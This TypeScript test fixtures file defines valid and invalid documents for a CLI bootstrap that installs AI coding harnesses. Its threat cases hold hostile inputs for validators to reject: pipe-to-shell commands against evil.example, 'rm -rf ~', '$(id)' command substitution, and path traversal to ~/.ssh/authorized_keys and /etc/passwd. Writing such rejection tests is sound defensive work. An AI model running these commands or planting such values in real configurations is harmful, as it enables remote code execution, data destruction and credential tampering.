// Shared, deterministic fixtures for the bootstrap contracts (packages/cli/src/bootstrap/contracts). The later
// bootstrap tasks (discovery, planner, applier, artifacts, enrollment, harness adapters, CLI wiring) import these
// instead of inventing their own shapes, so every layer is tested against the same valid documents and the same
// threat cases. Everything here is plain JSON data: no clocks, no randomness, no keys. Signed artifact manifests
// are signed at test time with an ephemeral key (see signManifest in the contract tests); no key material is
// committed.
//
// Each `invalid` entry names the issue code the validator must report, so a rejection can never pass by accident.
import type {
  Action,
  ApplyLock,
  ArtifactManifest,
  DiscoverySnapshot,
  EnrollmentStatus,
  HarnessPin,
  HarnessVerification,
  JournalEntry,
  ManualEdit,
  PreviewToken,
  Profile,
  ResultEnvelope,
  SetupPlan,
  TransactionJournal,
  TrustRoot,
} from "../../src/bootstrap/contracts/index.ts"

/** An invalid document and the issue code (or outcome code) its check must report. */
export interface ThreatCase {
  readonly value: unknown
  readonly code: string
}

const hex = (c: string) => `sha256:${c.repeat(64)}`

export const DIGEST = {
  a: hex("a"),
  b: hex("b"),
  c: hex("c"),
  d: hex("d"),
  e: hex("e"),
  f: hex("f"),
} as const

/** Fixed instants (ms since the epoch) so previews, locks and journals are deterministic. */
export const T0 = 1_793_000_000_000
export const MINUTE = 60_000

export const HOST = DIGEST.a
export const OTHER_HOST = DIGEST.f
export const SNAPSHOT_DIGEST = DIGEST.b

// ---------- discovery ----------

export const DISCOVERY_DARWIN: DiscoverySnapshot = {
  schema: "hub.discovery-snapshot",
  version: 1,
  capturedAt: T0,
  host: {
    fingerprint: HOST,
    platform: "darwin",
    arch: "arm64",
    libc: "none",
    target: "darwin-arm64",
    supported: true,
    os: { name: "macOS", version: "15.4" },
  },
  topology: {
    container: "none",
    shims: [{ name: "opencode", path: "/Users/dev/.opencode/bin/opencode", kind: "host" }],
  },
  managers: {
    package: ["brew", "npm"],
    runtime: [{ id: "bun", version: "1.3.5", path: "/Users/dev/.bun/bin/bun" }],
    service: "launchd",
  },
  harnesses: [
    {
      id: "opencode",
      installed: true,
      path: "/Users/dev/.opencode/bin/opencode",
      version: "2.0.26",
      installMethod: "native",
      health: { state: "unverified", probes: [] },
    },
    { id: "claude-code", installed: false, health: { state: "unverified", probes: [] } },
    { id: "codex", installed: false, health: { state: "unverified", probes: [] } },
  ],
  runtimes: [{ id: "openshell", present: false }],
  configs: [
    { path: "/Users/dev/.config/hub/config.json", owner: "hub", format: "json", sha256: DIGEST.c },
    { path: "/Users/dev/.config/opencode/opencode.json", owner: "harness:opencode", format: "json", sha256: DIGEST.d },
  ],
  roots: [
    { id: "home", path: "/Users/dev" },
    { id: "config", path: "/Users/dev/.config" },
    { id: "state", path: "/Users/dev/.local/state" },
    { id: "data", path: "/Users/dev/.local/share" },
    { id: "user-bin", path: "/Users/dev/.local/bin" },
    { id: "launch-agents", path: "/Users/dev/Library/LaunchAgents" },
  ],
}

/** A Linux host running inside a container: the harness binary on PATH is a shim into the host. */
export const DISCOVERY_LINUX_CONTAINER: DiscoverySnapshot = {
  schema: "hub.discovery-snapshot",
  version: 1,
  capturedAt: T0,
  host: {
    fingerprint: DIGEST.e,
    platform: "linux",
    arch: "x64",
    libc: "glibc",
    target: "linux-x64",
    supported: true,
    os: { name: "Ubuntu", version: "24.04" },
  },
  topology: {
    container: "docker",
    shims: [{ name: "claude", path: "/usr/local/bin/claude", kind: "container-shim", resolvesTo: "/home/dev/.local/bin/claude" }],
  },
  managers: { package: ["apt", "npm"], runtime: [{ id: "node", version: "22.11.0", path: "/usr/bin/node" }], service: "none" },
  harnesses: [
    {
      id: "claude-code",
      installed: true,
      path: "/usr/local/bin/claude",
      version: "2.1.90",
      installMethod: "unknown",
      health: {
        state: "verified",
        probes: [
          { kind: "version-exec", ok: true, observedAt: T0 },
          { kind: "provider-auth", ok: true, observedAt: T0 },
          { kind: "spoke-connected", ok: true, observedAt: T0 },
        ],
      },
    },
  ],
  runtimes: [],
  configs: [],
  roots: [
    { id: "home", path: "/home/dev", containerPath: "/workspace/home" },
    { id: "config", path: "/home/dev/.config" },
    { id: "state", path: "/home/dev/.local/state" },
  ],
}

/** A host the bootstrap must describe but refuse to plan for. */
export const DISCOVERY_UNSUPPORTED: DiscoverySnapshot = {
  ...DISCOVERY_DARWIN,
  host: { fingerprint: HOST, platform: "linux", arch: "x64", libc: "musl", target: "linux-x64-musl", supported: false, os: { name: "Alpine", version: "3.20" } },
  managers: { package: ["apk"], runtime: [], service: "none" },
  harnesses: [],
  configs: [],
  roots: [{ id: "home", path: "/home/dev" }],
}

const withHost = (host: Partial<DiscoverySnapshot["host"]>) => ({ ...DISCOVERY_DARWIN, host: { ...DISCOVERY_DARWIN.host, ...host } })

export const DISCOVERY_INVALID: Record<string, ThreatCase> = {
  wrongSchema: { value: { ...DISCOVERY_DARWIN, schema: "hub.plan" }, code: "invalid_value" },
  futureVersion: { value: { ...DISCOVERY_DARWIN, version: 2 }, code: "unsupported_version" },
  unknownField: { value: { ...DISCOVERY_DARWIN, extra: true }, code: "unknown_field" },
  supportedLie: { value: withHost({ platform: "win32", arch: "x64", target: "windows-x64", supported: true }), code: "inconsistent" },
  targetMismatch: { value: withHost({ target: "linux-x64" }), code: "inconsistent" },
  relativePath: {
    value: { ...DISCOVERY_DARWIN, configs: [{ path: "../.config/hub/config.json", owner: "hub", format: "json", sha256: DIGEST.c }] },
    code: "invalid_path",
  },
  verifiedWithoutProbes: {
    value: { ...DISCOVERY_DARWIN, harnesses: [{ ...DISCOVERY_DARWIN.harnesses[0], health: { state: "verified", probes: [] } }] },
    code: "inconsistent",
  },
  verifiedByPresenceOnly: {
    value: {
      ...DISCOVERY_DARWIN,
      harnesses: [{ ...DISCOVERY_DARWIN.harnesses[0], health: { state: "verified", probes: [{ kind: "presence", ok: true, observedAt: T0 }] } }],
    },
    code: "inconsistent",
  },
  notInstalledButPath: {
    value: { ...DISCOVERY_DARWIN, harnesses: [{ id: "codex", installed: false, path: "/usr/bin/codex", health: { state: "unverified", probes: [] } }] },
    code: "inconsistent",
  },
  serviceManagerMismatch: { value: { ...DISCOVERY_DARWIN, managers: { ...DISCOVERY_DARWIN.managers, service: "systemd-user" } }, code: "inconsistent" },
  duplicateRoot: { value: { ...DISCOVERY_DARWIN, roots: [{ id: "home", path: "/Users/dev" }, { id: "home", path: "/Users/other" }] }, code: "duplicate" },
  secretInSnapshot: {
    value: { ...DISCOVERY_DARWIN, host: { ...DISCOVERY_DARWIN.host, os: { name: "macOS", version: "hat_abcdefghijklmnop" } } },
    code: "secret",
  },
}

// ---------- profiles ----------

export const PROFILE_SESSION_ONLY: Profile = {
  schema: "hub.bootstrap-profile",
  version: 1,
  id: "session-only",
  harnesses: ["opencode"],
  runtimes: [],
  services: [],
  launch: { enabled: false },
  escalation: "never",
}

export const PROFILE_LAUNCH_NODE: Profile = {
  schema: "hub.bootstrap-profile",
  version: 1,
  id: "launch-node",
  harnesses: ["opencode"],
  runtimes: [],
  services: ["node"],
  launch: { enabled: true, maxDurationS: 3600 },
  escalation: "never",
}

export const PROFILE_FULL_HARNESS: Profile = {
  schema: "hub.bootstrap-profile",
  version: 1,
  id: "full-harness",
  harnesses: ["opencode", "claude-code", "codex"],
  runtimes: ["openshell"],
  services: ["node", "claude-code", "codex-spoke"],
  launch: { enabled: true, maxDurationS: 3600 },
  escalation: "explicit",
}

/** A pre-v1 profile document, for exercising the migration hook with an injected migration. */
export const PROFILE_V0 = { schema: "hub.bootstrap-profile", version: 0, profile: "session-only", harness: "opencode" }

export const PROFILE_INVALID: Record<string, ThreatCase> = {
  unknownProfile: { value: { ...PROFILE_SESSION_ONLY, id: "root-everything" }, code: "invalid_value" },
  sessionOnlyWithService: { value: { ...PROFILE_SESSION_ONLY, services: ["node"] }, code: "inconsistent" },
  sessionOnlyWithLaunch: { value: { ...PROFILE_SESSION_ONLY, launch: { enabled: true, maxDurationS: 60 } }, code: "inconsistent" },
  launchNodeWithoutNode: { value: { ...PROFILE_LAUNCH_NODE, services: [] }, code: "inconsistent" },
  unboundedLaunch: { value: { ...PROFILE_LAUNCH_NODE, launch: { enabled: true } }, code: "inconsistent" },
  harnessOrder: { value: { ...PROFILE_FULL_HARNESS, harnesses: ["codex", "opencode"] }, code: "inconsistent" },
  spokeWithoutHarness: { value: { ...PROFILE_LAUNCH_NODE, services: ["node", "codex-spoke"] }, code: "inconsistent" },
  autoEscalation: { value: { ...PROFILE_SESSION_ONLY, escalation: "auto" }, code: "invalid_value" },
  fromTheFuture: { value: { ...PROFILE_SESSION_ONLY, version: 99 }, code: "unsupported_version" },
}

// ---------- actions and plans ----------

export const ACTIONS: Record<Action["kind"], Action> = {
  "ensure-directory": {
    id: "state-dir",
    kind: "ensure-directory",
    escalation: "user",
    summary: "Create the hub state directory",
    path: { root: "state", rel: "hub" },
    mode: 0o700,
  },
  "install-artifact": {
    id: "hubctl",
    kind: "install-artifact",
    escalation: "user",
    summary: "Install hubctl 0.8.0 for darwin-arm64",
    artifact: "hubctl",
    version: "0.8.0",
    target: "darwin-arm64",
    sha256: DIGEST.c,
    path: { root: "user-bin", rel: "hubctl" },
  },
  "link-executable": {
    id: "hub-alias",
    kind: "link-executable",
    escalation: "user",
    summary: "Link hub to hubctl (same command surface)",
    path: { root: "user-bin", rel: "hub" },
    target: { root: "user-bin", rel: "hubctl" },
  },
  "write-file": {
    id: "node-json",
    kind: "write-file",
    escalation: "user",
    summary: "Write the node's workspace roots",
    path: { root: "config", rel: "hub/node.json" },
    asset: "config/node.json",
    sha256: DIGEST.d,
    mode: 0o600,
    onConflict: "refuse",
  },
  "merge-config": {
    id: "opencode-plugin",
    kind: "merge-config",
    escalation: "user",
    summary: "Add the hub plugin to OpenCode's config",
    path: { root: "config", rel: "opencode/opencode.json" },
    format: "json",
    owner: "harness:opencode",
    precondition: { exists: true, sha256: DIGEST.d },
    set: [{ pointer: "/plugin/-", value: "@huynle/hub" }],
    preserveUnknown: true,
  },
  "register-mcp-server": {
    id: "opencode-mcp",
    kind: "register-mcp-server",
    escalation: "user",
    summary: "Register hubctl mcp with OpenCode",
    harness: "opencode",
    path: { root: "config", rel: "opencode/opencode.json" },
    name: "hub",
    precondition: { exists: true, sha256: DIGEST.d },
  },
  "install-service": {
    id: "node-service",
    kind: "install-service",
    escalation: "user",
    summary: "Write the hub node launchd agent",
    service: "node",
    manager: "launchd",
    path: { root: "launch-agents", rel: "io.github.huynle.hub-node.plist" },
    asset: "service/launchd/node",
    sha256: DIGEST.e,
  },
  "activate-service": {
    id: "node-activate",
    kind: "activate-service",
    escalation: "user",
    summary: "Load the hub node agent (explicitly confirmed)",
    service: "node",
    manager: "launchd",
    confirm: "explicit",
  },
  "enroll-machine": {
    id: "enroll",
    kind: "enroll-machine",
    escalation: "user",
    summary: "Enroll this machine with https://hub.example (device code)",
    server: "https://hub.example",
    machineName: "dev-mac",
  },
  "install-harness": {
    id: "install-opencode",
    kind: "install-harness",
    escalation: "user",
    summary: "Install OpenCode 2.0.26 for darwin-arm64 (pinned by hub 0.8.0)",
    harness: "opencode",
    version: "2.0.26",
    target: "darwin-arm64",
    source: { manifest: "0.8.0", url: "https://github.com/anomalyco/opencode/releases/download/v2.0.26/opencode-darwin-arm64.zip", file: "opencode-darwin-arm64.zip" },
    size: 40_000_000,
    sha256: DIGEST.e,
    evidence: [],
    path: { root: "data", rel: "hub/harnesses/opencode/2.0.26" },
    owner: "hub",
    rollback: "restore-previous",
  },
  "verify-harness": {
    id: "verify-opencode",
    kind: "verify-harness",
    escalation: "user",
    summary: "Verify OpenCode really runs and reaches a provider",
    harness: "opencode",
    probes: ["version-exec", "provider-auth", "spoke-connected"],
  },
  "verify-runtime": {
    id: "verify-openshell",
    kind: "verify-runtime",
    escalation: "user",
    summary: "Check OpenShell (opt-in)",
    runtime: "openshell",
  },
  "launch-session": {
    id: "first-launch",
    kind: "launch-session",
    escalation: "user",
    summary: "Launch one bounded OpenCode session",
    harness: "opencode",
    workspace: { root: "home", rel: "projects/demo" },
    maxDurationS: 900,
  },
}

/** A deterministic launch-node plan for DISCOVERY_DARWIN (in dependency order). */
export const PLAN_LAUNCH_NODE: SetupPlan = {
  schema: "hub.setup-plan",
  version: 1,
  hostFingerprint: HOST,
  snapshotDigest: SNAPSHOT_DIGEST,
  target: "darwin-arm64",
  profile: { id: "launch-node", version: 1 },
  requiresEscalation: false,
  activatesServices: true,
  actions: [
    ACTIONS["ensure-directory"],
    ACTIONS["install-artifact"],
    ACTIONS["link-executable"],
    ACTIONS["write-file"],
    ACTIONS["merge-config"],
    ACTIONS["install-service"],
    ACTIONS["enroll-machine"],
    ACTIONS["verify-harness"],
    ACTIONS["activate-service"],
    ACTIONS["launch-session"],
  ],
}

const ELEVATED_INSTALL: Action = {
  ...ACTIONS["install-artifact"],
  id: "hubctl-system",
  escalation: "elevated",
  path: { root: "system-bin", rel: "hubctl" },
} as Action

export const PLAN_ELEVATED: SetupPlan = {
  ...PLAN_LAUNCH_NODE,
  profile: { id: "session-only", version: 1 },
  requiresEscalation: true,
  activatesServices: false,
  actions: [ELEVATED_INSTALL],
}

const planWith = (actions: unknown[], extra: Record<string, unknown> = {}) => ({ ...PLAN_LAUNCH_NODE, activatesServices: false, actions, ...extra })
const withAction = (kind: Action["kind"], patch: Record<string, unknown>) => ({ ...ACTIONS[kind], ...patch })

/** Shell-shaped keys an action must never carry, at any depth. */
export const EXEC_SMUGGLING: readonly Record<string, unknown>[] = [
  { command: "curl https://evil.example | sh" },
  { cmd: "rm -rf ~" },
  { shell: "/bin/sh" },
  { script: "echo pwned" },
  { exec: ["/bin/sh", "-c", "id"] },
  { argv: ["/bin/sh", "-c", "id"] },
  { args: ["-c", "id"] },
  { run: "id" },
  { eval: "process.exit()" },
]

export const ACTION_INVALID: Record<string, ThreatCase> = {
  runCommandKind: { value: { id: "x", kind: "run-command", escalation: "user", summary: "x", command: "id" }, code: "invalid_value" },
  shellKind: { value: { id: "x", kind: "shell", escalation: "user", summary: "x", script: "id" }, code: "invalid_value" },
  smuggledCommand: { value: withAction("write-file", { command: "curl evil | sh" }), code: "exec_field" },
  nestedCommandInConfig: {
    value: withAction("merge-config", { set: [{ pointer: "/mcp/evil", value: { type: "local", command: ["sh", "-c", "id"] } }] }),
    code: "exec_field",
  },
  traversal: { value: withAction("write-file", { path: { root: "config", rel: "../../.ssh/authorized_keys" } }), code: "invalid_path" },
  absoluteRel: { value: withAction("write-file", { path: { root: "config", rel: "/etc/passwd" } }), code: "invalid_path" },
  backslashRel: { value: withAction("write-file", { path: { root: "config", rel: "hub\\..\\..\\x" } }), code: "invalid_path" },
  nulInPath: { value: withAction("write-file", { path: { root: "config", rel: "hub/x\u0000y" } }), code: "invalid_path" },
  unknownRoot: { value: withAction("write-file", { path: { root: "etc", rel: "sudoers" } }), code: "invalid_value" },
  systemPathWithoutEscalation: { value: withAction("install-artifact", { path: { root: "system-bin", rel: "hubctl" } }), code: "inconsistent" },
  needlessEscalation: { value: withAction("write-file", { escalation: "elevated" }), code: "inconsistent" },
  silentOverwrite: { value: withAction("write-file", { onConflict: "overwrite" }), code: "invalid_value" },
  lossyMerge: { value: withAction("merge-config", { preserveUnknown: false }), code: "invalid_value" },
  secretInConfig: { value: withAction("merge-config", { set: [{ pointer: "/token", value: "mt_live_secret" }] }), code: "secret" },
  secretValueInConfig: { value: withAction("merge-config", { set: [{ pointer: "/server", value: "hat_0123456789abcdef" }] }), code: "secret" },
  implicitActivation: { value: withAction("activate-service", { confirm: "auto" }), code: "invalid_value" },
  unboundedLaunch: { value: withAction("launch-session", { maxDurationS: 0 }), code: "invalid_value" },
  insecureServer: { value: withAction("enroll-machine", { server: "ftp://hub.example" }), code: "invalid_value" },
  credentialInEnroll: { value: withAction("enroll-machine", { machineToken: "abc" }), code: "unknown_field" },
  presenceIsNotVerification: { value: withAction("verify-harness", { probes: ["presence"] }), code: "invalid_value" },
  multilineSummary: { value: withAction("write-file", { summary: "ok\n$(id)" }), code: "invalid_value" },
}

export const PLAN_INVALID: Record<string, ThreatCase> = {
  duplicateActionID: { value: planWith([ACTIONS["ensure-directory"], ACTIONS["ensure-directory"]]), code: "duplicate" },
  hiddenEscalation: { value: { ...PLAN_ELEVATED, requiresEscalation: false }, code: "inconsistent" },
  hiddenActivation: {
    value: planWith([ACTIONS["install-service"], ACTIONS["activate-service"]], { activatesServices: false }),
    code: "inconsistent",
  },
  activateBeforeInstall: { value: planWith([ACTIONS["activate-service"], ACTIONS["install-service"]], { activatesServices: true }), code: "inconsistent" },
  launchBeforeVerify: { value: planWith([ACTIONS["launch-session"], ACTIONS["verify-harness"]]), code: "inconsistent" },
  twoEnrollments: { value: planWith([ACTIONS["enroll-machine"], { ...ACTIONS["enroll-machine"], id: "enroll-2" }]), code: "duplicate" },
  unsupportedTarget: { value: { ...PLAN_LAUNCH_NODE, target: "windows-x64" }, code: "unsupported_platform" },
  smuggledAction: { value: planWith([{ ...ACTIONS["ensure-directory"], shell: "bash" }]), code: "exec_field" },
}

export const PREVIEW: PreviewToken = {
  schema: "hub.preview-token",
  version: 1,
  planDigest: DIGEST.c, // replaced with the real digest of PLAN_LAUNCH_NODE in the tests
  hostFingerprint: HOST,
  snapshotDigest: SNAPSHOT_DIGEST,
  issuedAt: T0,
  expiresAt: T0 + 10 * MINUTE,
  nonce: "n0nce-0123456789abcdef",
}

export const PREVIEW_INVALID: Record<string, ThreatCase> = {
  tooLong: { value: { ...PREVIEW, expiresAt: T0 + 16 * MINUTE }, code: "invalid_value" },
  expiresBeforeIssued: { value: { ...PREVIEW, expiresAt: T0 - 1 }, code: "invalid_value" },
  shortNonce: { value: { ...PREVIEW, nonce: "abc" }, code: "invalid_value" },
  badDigest: { value: { ...PREVIEW, planDigest: "md5:abc" }, code: "invalid_value" },
}

// ---------- artifacts ----------

/** An unsigned hubctl release manifest; the tests add signatures with an ephemeral key. */
export const MANIFEST_UNSIGNED: Omit<ArtifactManifest, "signatures"> = {
  schema: "hub.artifact-manifest",
  version: 1,
  product: "hubctl",
  release: "0.8.0",
  channel: "stable",
  minimumVersion: "0.7.0",
  issuedAt: T0,
  artifacts: [
    { target: "darwin-arm64", file: "hubctl-darwin-arm64", size: 61_000_000, sha256: DIGEST.a },
    { target: "darwin-x64", file: "hubctl-darwin-x64", size: 64_000_000, sha256: DIGEST.b },
    { target: "linux-x64", file: "hubctl-linux-x64", size: 99_000_000, sha256: DIGEST.c },
    { target: "linux-arm64", file: "hubctl-linux-arm64", size: 98_000_000, sha256: DIGEST.d },
  ],
  harnesses: [
    {
      harness: "opencode",
      version: "2.0.26",
      target: "darwin-arm64",
      url: "https://github.com/anomalyco/opencode/releases/download/v2.0.26/opencode-darwin-arm64.zip",
      file: "opencode-darwin-arm64.zip",
      size: 40_000_000,
      sha256: DIGEST.e,
      evidence: [],
    },
    {
      harness: "claude-code",
      version: "2.1.90",
      target: "darwin-arm64",
      url: "https://downloads.claude.ai/claude-code-releases/2.1.90/darwin-arm64/claude",
      file: "claude",
      size: 200_000_000,
      sha256: DIGEST.f,
      evidence: ["gpg-manifest", "macos-notarization"],
      minimumVersion: "2.1.89",
    },
    {
      harness: "codex",
      version: "0.165.0",
      target: "linux-x64",
      url: "https://github.com/openai/codex/releases/download/rust-v0.165.0/codex-x86_64-unknown-linux-musl.tar.gz",
      file: "codex-x86_64-unknown-linux-musl.tar.gz",
      size: 30_000_000,
      sha256: DIGEST.b,
      evidence: ["sigstore"],
    },
  ],
}

/** Placeholder trust root; the tests substitute an ephemeral public key for `publicKey`. */
export const TRUST_ROOT_TEMPLATE: TrustRoot = {
  schema: "hub.trust-root",
  version: 1,
  threshold: 1,
  keys: [{ keyID: "hub-release-1", algorithm: "ed25519", publicKey: "REPLACED_IN_TESTS", status: "active" }],
}

export const MANIFEST_INVALID: Record<string, ThreatCase> = {
  windowsTarget: {
    value: { ...MANIFEST_UNSIGNED, signatures: [], artifacts: [{ target: "windows-x64", file: "hubctl.exe", size: 1, sha256: DIGEST.a }] },
    code: "unsupported_platform",
  },
  duplicateTarget: {
    value: { ...MANIFEST_UNSIGNED, signatures: [], artifacts: [MANIFEST_UNSIGNED.artifacts[0], MANIFEST_UNSIGNED.artifacts[0]] },
    code: "duplicate",
  },
  pathInFile: {
    value: { ...MANIFEST_UNSIGNED, signatures: [], artifacts: [{ ...MANIFEST_UNSIGNED.artifacts[0]!, file: "../hubctl" }] },
    code: "invalid_path",
  },
  floorAboveRelease: { value: { ...MANIFEST_UNSIGNED, signatures: [], minimumVersion: "0.9.0" }, code: "inconsistent" },
  badVersion: { value: { ...MANIFEST_UNSIGNED, signatures: [], release: "latest" }, code: "invalid_value" },
  unknownAlgorithm: { value: { ...MANIFEST_UNSIGNED, signatures: [{ keyID: "k", algorithm: "rsa-md5", value: "AAAA" }] }, code: "invalid_value" },
}

// ---------- enrollment ----------

export const ENROLLMENT_VERIFIED: EnrollmentStatus = {
  schema: "hub.enrollment-status",
  version: 1,
  state: "verified",
  server: "https://hub.example",
  machineID: "mach_01",
  machineName: "dev-mac",
  checkedAt: T0,
}

export const ENROLLMENT_UNCONFIGURED: EnrollmentStatus = { schema: "hub.enrollment-status", version: 1, state: "unconfigured" }

export const ENROLLMENT_INVALID: Record<string, ThreatCase> = {
  tokenField: { value: { ...ENROLLMENT_VERIFIED, token: "mt_secret" }, code: "unknown_field" },
  tokenInDetail: { value: { ...ENROLLMENT_VERIFIED, detail: "using hat_0123456789abcdef" }, code: "secret" },
  verifiedWithoutMachine: { value: { schema: "hub.enrollment-status", version: 1, state: "verified", server: "https://hub.example" }, code: "inconsistent" },
  unknownState: { value: { ...ENROLLMENT_VERIFIED, state: "trusted" }, code: "invalid_value" },
}

// ---------- journal and lock ----------

export const JOURNAL_APPLYING: TransactionJournal = {
  schema: "hub.transaction-journal",
  version: 1,
  txID: "tx_0001",
  planDigest: DIGEST.c,
  hostFingerprint: HOST,
  nonce: PREVIEW.nonce,
  state: "applying",
  startedAt: T0,
  updatedAt: T0 + 1000,
  entries: [
    {
      seq: 1,
      actionID: "state-dir",
      kind: "ensure-directory",
      class: "directory",
      path: { root: "state", rel: "hub" },
      before: { exists: false },
      after: { exists: true, mode: 0o700 },
      status: "done",
    },
    {
      seq: 2,
      actionID: "opencode-plugin",
      kind: "merge-config",
      class: "config",
      path: { root: "config", rel: "opencode/opencode.json" },
      before: { exists: true, sha256: DIGEST.d, mode: 0o644 },
      after: { exists: true, sha256: DIGEST.e, mode: 0o644 },
      backup: { id: "bk_0002" },
      status: "done",
    },
    {
      seq: 3,
      actionID: "enroll",
      kind: "enroll-machine",
      class: "credential",
      path: { root: "config", rel: "hub/config.json" },
      before: { exists: true, sha256: DIGEST.a, mode: 0o600 },
      after: { exists: true, sha256: DIGEST.b, mode: 0o600 },
      status: "done",
    },
    {
      seq: 4,
      actionID: "node-json",
      kind: "write-file",
      class: "file",
      path: { root: "config", rel: "hub/node.json" },
      before: { exists: false },
      after: { exists: true, sha256: DIGEST.f, mode: 0o600 },
      status: "pending",
    },
  ],
}

const entryPatch = (index: number, patch: Record<string, unknown>) => ({
  ...JOURNAL_APPLYING,
  entries: JOURNAL_APPLYING.entries.map((entry, i) => (i === index ? { ...entry, ...patch } : entry)),
})

export const JOURNAL_INVALID: Record<string, ThreatCase> = {
  credentialBackup: { value: entryPatch(2, { backup: { id: "bk_creds" } }), code: "inconsistent" },
  missingBackup: { value: entryPatch(1, { backup: undefined }), code: "inconsistent" },
  contentInJournal: { value: entryPatch(1, { content: "{\"token\":\"x\"}" }), code: "unknown_field" },
  secretInJournal: { value: { ...JOURNAL_APPLYING, txID: "hst1.abc.def" }, code: "secret" },
  gapInSeq: { value: entryPatch(3, { seq: 9 }), code: "inconsistent" },
  doneWithoutAfter: { value: entryPatch(0, { after: undefined }), code: "inconsistent" },
  traversal: { value: entryPatch(0, { path: { root: "state", rel: "../../etc" } }), code: "invalid_path" },
}

export const LOCK: ApplyLock = {
  schema: "hub.apply-lock",
  version: 1,
  pid: 4242,
  hostFingerprint: HOST,
  txID: "tx_0001",
  acquiredAt: T0,
  expiresAt: T0 + 30 * MINUTE,
}

// ---------- harness verification ----------

export const VERIFICATION_READY: HarnessVerification = {
  harness: "opencode",
  probes: [
    { kind: "presence", ok: true, observedAt: T0 },
    { kind: "version-exec", ok: true, observedAt: T0, detail: "opencode 2.0.26" },
    { kind: "provider-auth", ok: true, observedAt: T0 },
    { kind: "spoke-connected", ok: true, observedAt: T0 },
  ],
}

export const VERIFICATION_INSTALLED_ONLY: HarnessVerification = {
  harness: "opencode",
  probes: [{ kind: "presence", ok: true, observedAt: T0 }],
}

// ---------- output envelope ----------

export const ENVELOPE_OK: ResultEnvelope = {
  schema: "hub.bootstrap.result",
  version: 1,
  command: "machine status",
  ok: true,
  data: ENROLLMENT_VERIFIED,
}

export const ENVELOPE_ERROR: ResultEnvelope = {
  schema: "hub.bootstrap.result",
  version: 1,
  command: "setup apply",
  ok: false,
  error: { code: "preview_stale", message: "The plan changed since the preview; run the preview again" },
}

export const ENVELOPE_INVALID: Record<string, ThreatCase> = {
  okWithError: { value: { ...ENVELOPE_OK, error: { code: "conflict", message: "x" } }, code: "inconsistent" },
  failureWithoutError: { value: { ...ENVELOPE_ERROR, error: undefined }, code: "inconsistent" },
  unknownCode: { value: { ...ENVELOPE_ERROR, error: { code: "oops", message: "x" } }, code: "invalid_value" },
  leakedToken: { value: { ...ENVELOPE_OK, data: { machineToken: "abc123" } }, code: "secret" },
}

// ---------- pinned harness installs ----------

export const HARNESS_PINS: readonly HarnessPin[] = MANIFEST_UNSIGNED.harnesses

export const INSTALL_CLAUDE: Action = {
  id: "install-claude",
  kind: "install-harness",
  escalation: "user",
  summary: "Install Claude Code 2.1.90 for darwin-arm64 (pinned by hub 0.8.0)",
  harness: "claude-code",
  version: "2.1.90",
  target: "darwin-arm64",
  source: { manifest: "0.8.0", url: "https://downloads.claude.ai/claude-code-releases/2.1.90/darwin-arm64/claude", file: "claude" },
  size: 200_000_000,
  sha256: DIGEST.f,
  evidence: ["gpg-manifest", "macos-notarization"],
  path: { root: "data", rel: "hub/harnesses/claude-code/2.1.90" },
  owner: "hub",
  rollback: "restore-previous",
  previous: { version: "2.1.85", sha256: DIGEST.c },
}

export const INSTALL_CODEX: Action = {
  id: "install-codex",
  kind: "install-harness",
  escalation: "user",
  summary: "Install Codex 0.165.0 for linux-x64 (pinned by hub 0.8.0)",
  harness: "codex",
  version: "0.165.0",
  target: "linux-x64",
  source: { manifest: "0.8.0", url: "https://github.com/openai/codex/releases/download/rust-v0.165.0/codex-x86_64-unknown-linux-musl.tar.gz", file: "codex-x86_64-unknown-linux-musl.tar.gz" },
  size: 30_000_000,
  sha256: DIGEST.b,
  evidence: ["sigstore"],
  path: { root: "data", rel: "hub/harnesses/codex/0.165.0" },
  owner: "hub",
  rollback: "restore-previous",
}

const VERIFY_CLAUDE: Action = { ...ACTIONS["verify-harness"], id: "verify-claude", harness: "claude-code", summary: "Verify Claude Code really runs" } as Action

/** Installs then verifies (install is never readiness). */
export const PLAN_HARNESS_INSTALL: SetupPlan = {
  ...PLAN_LAUNCH_NODE,
  profile: { id: "session-only", version: 1 },
  requiresEscalation: false,
  activatesServices: false,
  actions: [ACTIONS["install-harness"], ACTIONS["verify-harness"], INSTALL_CLAUDE, VERIFY_CLAUDE],
}

const harnessWith = (patch: Record<string, unknown>) => ({ ...ACTIONS["install-harness"], ...patch })

export const HARNESS_ACTION_INVALID: Record<string, ThreatCase> = {
  plainHttp: { value: harnessWith({ source: { ...(ACTIONS["install-harness"] as any).source, url: "http://github.com/x/opencode.zip" } }), code: "invalid_value" },
  floatingVersion: { value: harnessWith({ version: "latest" }), code: "invalid_value" },
  noDigest: { value: harnessWith({ sha256: undefined }), code: "missing_field" },
  foreignEvidence: { value: harnessWith({ evidence: ["sigstore"] }), code: "invalid_value" },
  notOwned: { value: harnessWith({ owner: "user" }), code: "invalid_value" },
  noRollback: { value: harnessWith({ rollback: "none" }), code: "invalid_value" },
  pathInFile: { value: harnessWith({ source: { ...(ACTIONS["install-harness"] as any).source, file: "../opencode" } }), code: "invalid_path" },
  installerScript: { value: harnessWith({ source: { ...(ACTIONS["install-harness"] as any).source, installer: "https://opencode.ai/install" } }), code: "unknown_field" },
  systemWithoutEscalation: { value: harnessWith({ path: { root: "system-bin", rel: "opencode" } }), code: "inconsistent" },
  unsupportedTarget: { value: harnessWith({ target: "linux-x64-musl" }), code: "unsupported_platform" },
}

/** install-harness actions checked against the signed manifest's pins, with the outcome code. */
export const HARNESS_PIN_INVALID: Record<string, ThreatCase> = {
  unpinnedTarget: { value: harnessWith({ target: "linux-arm64" }), code: "unpinned_artifact" },
  unpinnedVersion: { value: harnessWith({ version: "2.0.27" }), code: "unpinned_artifact" },
  digestMismatch: { value: harnessWith({ sha256: DIGEST.a }), code: "integrity_mismatch" },
  sourceMismatch: {
    value: harnessWith({ source: { manifest: "0.8.0", url: "https://evil.example/opencode-darwin-arm64.zip", file: "opencode-darwin-arm64.zip" } }),
    code: "integrity_mismatch",
  },
  otherHubRelease: { value: harnessWith({ source: { ...(ACTIONS["install-harness"] as any).source, manifest: "0.7.9" } }), code: "unpinned_artifact" },
  /** Upstream evidence the pin says is available (Codex sigstore) must be attempted. */
  evidenceSkipped: { value: { ...INSTALL_CODEX, evidence: [] }, code: "inconsistent" },
}

export const PLAN_HARNESS_INVALID: Record<string, ThreatCase> = {
  installWithoutVerify: { value: { ...PLAN_HARNESS_INSTALL, actions: [ACTIONS["install-harness"]] }, code: "inconsistent" },
  verifyBeforeInstall: { value: { ...PLAN_HARNESS_INSTALL, actions: [ACTIONS["verify-harness"], ACTIONS["install-harness"]] }, code: "inconsistent" },
}

